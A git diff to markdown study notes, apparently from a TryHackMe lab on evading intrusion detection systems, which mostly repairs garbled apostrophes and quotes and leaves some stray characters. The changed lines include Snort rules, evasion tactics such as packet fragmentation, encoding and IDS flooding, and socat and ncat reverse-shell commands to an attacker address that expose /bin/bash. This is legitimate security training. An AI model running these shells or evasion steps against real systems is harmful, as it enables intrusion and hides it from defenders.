@@ -37,21 +37,21 @@ In the figure below, we use two red circles to show the difference in the covera
 
 We can classify network traffic into:
 
-1. **Benign traffic**: This is the usual traffic that we expect to have and donâ€™t want the IDS to alert us about.
-2. **Malicious traffic**: This is abnormal traffic that we donâ€™t expect to see under normal conditions and consequently want the IDS to detect it.
+1. **Benign traffic**: This is the usual traffic that we expect to have and don't want the IDS to alert us about.
+2. **Malicious traffic**: This is abnormal traffic that we don't expect to see under normal conditions and consequently want the IDS to detect it.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ce5ea133da9aaa810b982e4745d4e635.png) 
 
-In the same way that we can classify network traffic, we can also classify host activity. The IDS detection engine is either built around detecting malicious traffic and activity or around recognizing normal traffic and activity. Recognizing â€œnormalâ€ makes it easy to detect any deviation from normal.
+In the same way that we can classify network traffic, we can also classify host activity. The IDS detection engine is either built around detecting malicious traffic and activity or around recognizing normal traffic and activity. Recognizing œnormal makes it easy to detect any deviation from normal.
 
 Consequently, the detection engine of an IDS can be:
 
 1. **Signature-based**: A signature-based IDS requires full knowledge of malicious (or unwanted) traffic. In other words, we need to explicitly feed the signature-based detection engine the characteristics of malicious traffic. Teaching the IDS about malicious traffic can be achieved using explicit rules to match against.
-2. **Anomaly-based**: This requires the IDS to have knowledge of what regular traffic looks like. In other words, we need to â€œteachâ€ the IDS what normal is so that it can recognize what is **not** normal. Teaching the IDS about normal traffic, i.e., baseline traffic can be achieved using machine learning or manual rules.
+2. **Anomaly-based**: This requires the IDS to have knowledge of what regular traffic looks like. In other words, we need to œteach the IDS what normal is so that it can recognize what is **not** normal. Teaching the IDS about normal traffic, i.e., baseline traffic can be achieved using machine learning or manual rules.
 
 Put in another way, signature-based IDS recognizes malicious traffic, so everything that is not malicious is considered benign (normal). This approach is commonly found in anti-virus software, which has a database of known virus signatures. Anything that matches a signature is detected as a virus.
 
-An anomaly-based IDS recognizes normal traffic, so anything that deviates from normal is considered malicious. This approach is more similar to how human beings perceive things; you have certain expectations for speed, performance, and responsiveness when you start your web browser. In other words, you know what â€œnormalâ€ is for your browser. If suddenly you notice that your web browser is too sluggish or unresponsive, you will know that something is wrong. In other words, you knew it when your browserâ€™s performance deviated from normal.
+An anomaly-based IDS recognizes normal traffic, so anything that deviates from normal is considered malicious. This approach is more similar to how human beings perceive things; you have certain expectations for speed, performance, and responsiveness when you start your web browser. In other words, you know what œnormal is for your browser. If suddenly you notice that your web browser is too sluggish or unresponsive, you will know that something is wrong. In other words, you knew it when your browser's performance deviated from normal.
 
 
 ![Pasted image 20250523134701.png](../../../IMAGES/Pasted%20image%2020250523134701.png)
@@ -74,13 +74,13 @@ Below is an example rule to`drop` all ICMP traffic passing through Snort IPS:
 
 `drop icmp any any -> any any (msg: "ICMP Ping Scan"; dsize:0; sid:1000020; rev: 1;)`
 
-The rule above instructs the Snort IPS to drop any packet of type ICMP from any source IP address (on any port) to any destination IP address (on any port). The message to be added to the logs is â€œICMP Ping Scan.â€
+The rule above instructs the Snort IPS to drop any packet of type ICMP from any source IP address (on any port) to any destination IP address (on any port). The message to be added to the logs is œICMP Ping Scan.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b77e611870d301ecd622311ec1100d83.png) 
 
-Letâ€™s consider a hypothetical case where a vulnerability is discovered in our web server. This vulnerability lies in how our web server handles HTTP POST method requests, allowing the attacker to run system commands.
+Let's consider a hypothetical case where a vulnerability is discovered in our web server. This vulnerability lies in how our web server handles HTTP POST method requests, allowing the attacker to run system commands.
 
-Letâ€™s consider the following â€œnaiveâ€ approach. We want to create a Snort rule that detects the term`ncat` in the payload of the traffic exchanged with our webserver to learn how people exploit this vulnerability.
+Let's consider the following œnaive approach. We want to create a Snort rule that detects the term`ncat` in the payload of the traffic exchanged with our webserver to learn how people exploit this vulnerability.
 
 `alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"ncat"; sid: 1000030; rev:1;)`
 
@@ -135,7 +135,7 @@ Evading a signature-based IDS/IPS requires that you manipulate your traffic so t
 
 This room focuses on evasion using`nmap` and`ncat`/`socat`. The evasion techniques related to Nmap are discussed in great detail in the [Firewalls](https://tryhackme.com/room/redteamfirewalls) room. This room will emphasize`ncat` and`socat` where appropriate.
 
-We will expand on each of these approaches in its own task. Letâ€™s start with the first one. Evasion via protocol manipulation includes:
+We will expand on each of these approaches in its own task. Let's start with the first one. Evasion via protocol manipulation includes:
 
 - Relying on a different protocol
 - Manipulating (Source) TCP/UDP port
@@ -146,7 +146,7 @@ We will expand on each of these approaches in its own task. Letâ€™s start w
 
 ### Rely on a Different Protocol
 
-The IDS/IPS system might be configured to block certain protocols and allow others. For instance, you might consider using UDP instead of TCP or rely on HTTP instead of DNS to deliver an attack or exfiltrate data. You can use the knowledge you have gathered about the target and the applications necessary for the target organization to design your attack. For instance, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. In one case, the client relied on Google services for their business, so the attacker used Google web hosting to conceal his malicious site. Unfortunately, it is not a one-size-fits-all; moreover, some trial and error might be necessary as long as you donâ€™t create too much noise.
+The IDS/IPS system might be configured to block certain protocols and allow others. For instance, you might consider using UDP instead of TCP or rely on HTTP instead of DNS to deliver an attack or exfiltrate data. You can use the knowledge you have gathered about the target and the applications necessary for the target organization to design your attack. For instance, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. In one case, the client relied on Google services for their business, so the attacker used Google web hosting to conceal his malicious site. Unfortunately, it is not a one-size-fits-all; moreover, some trial and error might be necessary as long as you don't create too much noise.
 
 We have an IPS set to block DNS queries and HTTP requests in the figure below. In particular, it enforces the policy where local machines cannot query external DNS servers but should instead query the local DNS server; moreover, it enforces secure HTTP communications. It is relatively permissive when it comes to HTTPS. In this case, using HTTPS to tunnel traffic looks like a promising approach to evade the IPS.
 
@@ -200,7 +200,7 @@ Alternatively, you can make it appear more like web traffic where clients commun
 
 ### Use Session Splicing (IP Packet Fragmentation)
 
-Another approach possible in IPv4 is IP packet fragmentation, i.e., session splicing. The assumption is that if you break the packet(s) related to an attack into smaller packets, you will avoid matching the IDS signatures. If the IDS is looking for a particular stream of bytes to detect the malicious payload, divide your payload among multiple packets. Unless the IDS reassembles the packets, the rule wonâ€™t be triggered.
+Another approach possible in IPv4 is IP packet fragmentation, i.e., session splicing. The assumption is that if you break the packet(s) related to an attack into smaller packets, you will avoid matching the IDS signatures. If the IDS is looking for a particular stream of bytes to detect the malicious payload, divide your payload among multiple packets. Unless the IDS reassembles the packets, the rule won't be triggered.
 
 Nmap offers a few options to fragment packets. You can add:
 
@@ -210,7 +210,7 @@ Nmap offers a few options to fragment packets. You can add:
 
 Suppose you want to force all your packets to be fragmented into specific sizes. In that case, you should consider using a program such as [Fragroute](https://www.monkey.org/~dugsong/fragroute/).`fragroute` can be set to read a set of rules from a given configuration file and applies them to incoming packets. For simple IP packet fragmentation, it would be enough to use a configuration file with`ip_frag SIZE` to fragment the IP data according to the provided size. The size should be a multiple of 8.
 
-For example, you can create a configuration file`fragroute.conf` with one line,`ip_frag 16`, to fragment packets where IP data fragments donâ€™t exceed 16 bytes. Then you would run the command`fragroute -f fragroute.conf HOST`. The host is the destination to which we would send the fragmented packets it.
+For example, you can create a configuration file`fragroute.conf` with one line,`ip_frag 16`, to fragment packets where IP data fragments don't exceed 16 bytes. Then you would run the command`fragroute -f fragroute.conf HOST`. The host is the destination to which we would send the fragmented packets it.
 
 ### Sending Invalid Packets
 
@@ -310,13 +310,13 @@ If you use the format`\uXXXX`, then`ncat -lvnp 1234 -e /bin/bash` becomes`\u006e
 
 ### Encrypt the Communication Channel
 
-Because an IDS/IPS wonâ€™t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.
+Because an IDS/IPS won't inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.
 
-One direct approach is to create the necessary encryption key on the attackerâ€™s system and set`socat` to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps:
+One direct approach is to create the necessary encryption key on the attacker's system and set`socat` to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps:
 
 1. Create the key
-2. Listen on the attackerâ€™s machine
-3. Connect to the attackerâ€™s machine
+2. Listen on the attacker's machine
+3. Connect to the attacker's machine
 
 **Firstly**, On the AttackBox or any Linux system, we can create the key using`openssl`.
 
@@ -324,7 +324,7 @@ One direct approach is to create the necessary encryption key on the attackerâ�
 
 The arguments in the above command are:
 
-- `req` indicates that this is a certificate signing request. Obviously, we wonâ€™t submit our certificate for signing.
+- `req` indicates that this is a certificate signing request. Obviously, we won't submit our certificate for signing.
 - `-x509` specifies that we want an X.509 certificate
 - `-newkey rsa:4096` creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size, such as`-newkey rsa:2048`.)
 - `-days 365` shows that the validity of our certificate will be one year
@@ -351,12 +351,12 @@ If you are not familiar with`socat`, the options that we used are:
 - `-d -d` provides some debugging data (fatal, error, warning, and notice messages)
 - `OPENSSL-LISTEN:PORT_NUM` indicates that the connection will be encrypted using OPENSSL
 - `cert=PEM_FILE` provides the PEM file (certificate and private key) to establish the encrypted connection
-- `verify=0` disables checking peerâ€™s certificate
+- `verify=0` disables checking peer's certificate
 - `fork` creates a sub-process to handle each new connection.
 
 **Thirdly**, on the victim system,`socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash`. Note that the`EXEC` invokes the specified program.
 
-Letâ€™s demonstrate this. On the attacker system, we carried out the following:
+Let's demonstrate this. On the attacker system, we carried out the following:
 
 Pentester Terminal
 
@@ -383,7 +383,7 @@ Target Terminal
 pentester@target$ socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
 ```
 
-Back to the attacker system, letâ€™s run`cat /etc/passwd`:
+Back to the attacker system, let's run`cat /etc/passwd`:
 
 Pentester Terminal
 
@@ -404,15 +404,15 @@ However, if the IDS/IPS inspects the traffic, all the packet data will be encryp
 
 As you can tell, it is not possible to make sense of the commands or data being exchanged. To better see the value of the added layer of encryption, we will compare this with an equivalent`socat` connection that does not use encryption.
 
-1. On the attackerâ€™s system, we run`socat -d -d TCP-LISTEN:4443,fork STDOUT`.
-2. On the victimâ€™s machine, we run`socat TCP:10.20.30.129:4443 EXEC:/bin/bash`.
-3. Back on the attackerâ€™s system, we type`cat /etc/passwd` and hit Enter/Return.
+1. On the attacker's system, we run`socat -d -d TCP-LISTEN:4443,fork STDOUT`.
+2. On the victim's machine, we run`socat TCP:10.20.30.129:4443 EXEC:/bin/bash`.
+3. Back on the attacker's system, we type`cat /etc/passwd` and hit Enter/Return.
 
 Because no encryption was used, capturing the traffic exchanged between the two systems will expose the commands, and the traffic exchanged. In the following screenshot, we can see the command sent by the attacker.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/08f8e9b8cdae4878dab23cbb57dfbbe2.png) 
 
-Furthermore, it is a trivial task to follow the TCP stream as it is in cleartext and learn everything exchanged between the attacker and the target system. The screenshot below uses the â€œFollow TCP Streamâ€ option from Wireshark.
+Furthermore, it is a trivial task to follow the TCP stream as it is in cleartext and learn everything exchanged between the attacker and the target system. The screenshot below uses the œFollow TCP Stream option from Wireshark.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/40f0e2f428db90b8b57d708d77eae99c.png) 
 
@@ -422,7 +422,7 @@ Consider the simple case where you want to use Ncat to create a bind shell. The 
 
 - Scanning for`ncat -lvnp` can be easily evaded by changing the order of the flags.
 - On the other hand, inspecting the payload for`ncat -` can be evaded by adding an extra white space, such as`ncat -` which would still run correctly on the target system.
-- If the IDS is looking for`ncat`, then simple changes to the original command wonâ€™t evade detection. We need to consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such as`nc` or`socat`. Alternatively, you can consider a different encoding if the target system can process it properly.
+- If the IDS is looking for`ncat`, then simple changes to the original command won't evade detection. We need to consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such as`nc` or`socat`. Alternatively, you can consider a different encoding if the target system can process it properly.
 
 
 ![Pasted image 20250523140826.png](../../../IMAGES/Pasted%20image%2020250523140826.png)
@@ -490,7 +490,7 @@ An IDS/IPS requires a high processing power as the number of rules grows and the
 - Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS.
 - Create a massive amount of not-malicious traffic that would still make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity.
 
-It is also worth noting that the target of your attack can be the IDS operator. By causing a vast number of false positives, you can cause operator fatigue against your â€œadversary.â€
+It is also worth noting that the target of your attack can be the IDS operator. By causing a vast number of false positives, you can cause operator fatigue against your œadversary.
 
 
 # C2 and IDS/IPS Evasion
